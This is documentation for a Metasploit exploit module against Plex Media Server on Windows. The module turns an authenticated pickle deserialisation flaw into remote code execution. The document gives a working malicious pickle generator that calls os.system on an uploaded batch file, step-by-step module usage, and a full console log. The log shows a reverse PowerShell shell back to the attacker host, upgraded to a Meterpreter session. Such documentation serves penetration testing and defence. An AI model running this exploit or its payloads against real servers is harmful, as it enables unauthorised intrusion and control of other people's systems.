## Vulnerable Application

This module exploits an authenticated Python unsafe `pickle.load` of a
`Dict` file. An authenticated attacker can create a photo library and
add arbitrary files to it. After setting the Windows only Plex
variable `LocalAppDataPath` to the newly created photo library, a file
named `Dict` will be unpickled, which causes an RCE as the user who
started Plex. Due to the restrictions of pickle RCE, we write our
payload to a file then simply execute it through the pickled `Dict`
file.

If an exploit fails, or is cancelled, `Dict` and `Dict.bat` are
left on disk, a new `ALBUM_NAME` will be required as subsuquent writes
will make `Dict-1` and `Dict-1.bat`, and not execute.

A vulnerable version of the software can be downloaded from
[uptodown.com](https://plex-media-server.en.uptodown.com/windows/versions),
specifically [1.18.5.2309](https://plex-media-server.en.uptodown.com/windows/download/2177216)
is vulnerable and used for developing the module.

### Pickle Stub

This exploit requires a python pickle file which can be generated with the following
code:

```
import pickle
import os

class EvilPickle(object):
  def __init__(self):
    pass
  def __reduce__(self):
     return (os.system,('c:\\Users\\Public\\mememe\\Dict.bat',))

e = EvilPickle()
pickle.dumps(e)
"cposix\nsystem\np0\n(S'c:\\\\Users\\\\Public\\\\mememe\\\\Dict.bat'\np1\ntp2\nRp3\n."
```

However, this was run on Linux and thus `posix` can be seen in the output.  When run
on Windows, the output will be slightly different and use `nt` isntead of `posix`.
The Windows version of the code is required.

### Pickle Gotchas

All the examples of Evil Pickle attacks seem to call one command/function.
[1](https://github.com/fhightower/evil-pickle/blob/master/evil_pickle_writer.py#L17),
[2](https://medium.com/@abhishek.dev.kumar.94/sour-pickle-insecure-deserialization-with-python-pickle-module-efa812c0d565),
[3](https://blog.nelhage.com/2011/03/exploiting-pickle/),
[4](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)

Either due to the pickling, or the HTTP server interaction, or running on Windows, all attempts to either call multi-function such as:
```eval(base64.b64decode())```
or execute OS commands with more than one parameter
```os.system('net user...')```
or
```os.system('powershell.exe ...')```
failed.  With this in mind, the strategy of uploading a payload file, and calling it was the one that worked.


## Verification Steps

  1. Install the application
  2. Register/Connect it to your Plex Premium account
  3. Start msfconsole
  4. Do: ```use windows/http/plex_unpickle_dict_rce```
  5. Do: ```run```
  6. You should get a shell.

## Options

### ALBUM_NAME

Name of the photo album to create.  Default is random 6 character.

### LIBRARY_PATH

The path to write the photo library to.  Must be valid.  Default is `C:\\Users\\Public`

### PLEX_TOKEN

The `X-Plex-Token` value from requests from an authenticated session.  To obtain this, simply use a browser
to log-in to the server, then check the requests for this header.

### REBOOT_SLEEP

Amount of seconds to sleep waiting on the server to reboot.  In testing `5` seemed to be OK, default is `10`.

### PAYLOAD

Payload is extremly picky, from testing only `cmd/windows/reverse_powershell` worked, however it was very reliable.

## Scenarios

### Plex 10.0.16299 on Windows 10 16299

  ```
  [*] Processing plex.rb for ERB directives.
  resource (plex.rb)> use exploit/windows/http/plex_unpickle_dict_rce
  resource (plex.rb)> set rhosts 1.1.1.1
  rhosts => 1.1.1.1
  resource (plex.rb)> set lhost 2.2.2.2
  lhost => 2.2.2.2
  resource (plex.rb)> set PLEX_TOKEN jy4g8mz2cmHbAaPBsEG7
  PLEX_TOKEN => jy4g8mz2cmHbAaPBsEG7
  resource (plex.rb)> set verbose true
  verbose => true
  resource (plex.rb)> exploit
  [*] Started reverse TCP handler on 2.2.2.2:4444 
  [*] Gathering Plex Config
  [*] Server Name: EXPLOITABLE -win10
  [+] Server OS: Windows (10.0 (Build 16299))
  [+] Server Version: 1.18.5.2309-f5213a238
  [*] Adding new photo library
  [+] Created Photo Library: 94
  [*] Adding pickled Dict to library
  [*] Adding payload to library root
  [*] Changing AppPath
  [*] Restarting Plex
  [*] Sleeping 10 seconds for server restart
  [*] Command shell session 1 opened (2.2.2.2:4444 -> 1.1.1.1:57277) at 2020-06-19 23:32:00 -0400
  [*] Cleanup Phase: Reverting changes from exploitation
  [*] Changing AppPath
  [*] Restarting Plex
  [!] Tried to delete C:\Users\Public\ULTTqY\Plex Media Server\Plug-in Support\Data\com.plexapp.system\Dict, unknown result
  [*] Deleting Photo Library
  [!] Tried to delete C:\Users\Public\ULTTqY\Dict.bat, unknown result
  
  Could Not Find C:\Windows\.exe
  
  C:\Windows>background
  
  Background session 1? [y/N]  y 
  ```

  ```
  msf5 exploit(windows/http/plex_unpickle_dict_rce) > sessions -u 1
  [*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]
  
  [*] Upgrading session ID: 1
  [*] Starting exploit/multi/handler
  [*] Started reverse TCP handler on 2.2.2.2:4433 
  msf5 exploit(windows/http/plex_unpickle_dict_rce) > 
  [*] Sending stage (176195 bytes) to 1.1.1.1
  [*] Meterpreter session 2 opened (2.2.2.2:4433 -> 1.1.1.1:57293) at 2020-06-19 23:33:43 -0400
  [*] Stopping exploit/multi/handler
  
  msf5 exploit(windows/http/plex_unpickle_dict_rce) > sessions -i 2
  [*] Starting interaction with 2...
  
  meterpreter > getuid
  Server username: WIN10PROLICENSE\windows
  meterpreter > sysinfo
  Computer        : WIN10PROLICENSE
  OS              : Windows 10 (10.0 Build 16299).
  Architecture    : x64
  System Language : en_US
  Domain          : WORKGROUP
  Logged On Users : 2
  Meterpreter     : x86/windows
  ```
